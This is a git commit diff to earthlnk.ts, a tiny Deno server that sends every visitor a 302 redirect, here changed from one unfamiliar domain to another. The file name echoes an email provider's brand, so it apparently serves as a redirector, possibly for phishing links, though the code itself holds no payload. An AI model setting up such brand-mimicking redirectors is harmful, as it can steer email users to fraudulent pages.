7a5678ad21125056349cdbb19bf589cee5190c6c
Digital2025001 <bosmichael30@gmail.com>
2025-12-13 08:14:11 -0800

    Update earthlnk.ts

--- earthlnk.ts
+++ earthlnk.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://AlbErgOtto.com/", // Replace this with your actual link
+      Location: "https://md182.com/", // Replace this with your actual link
     },
   });
 });
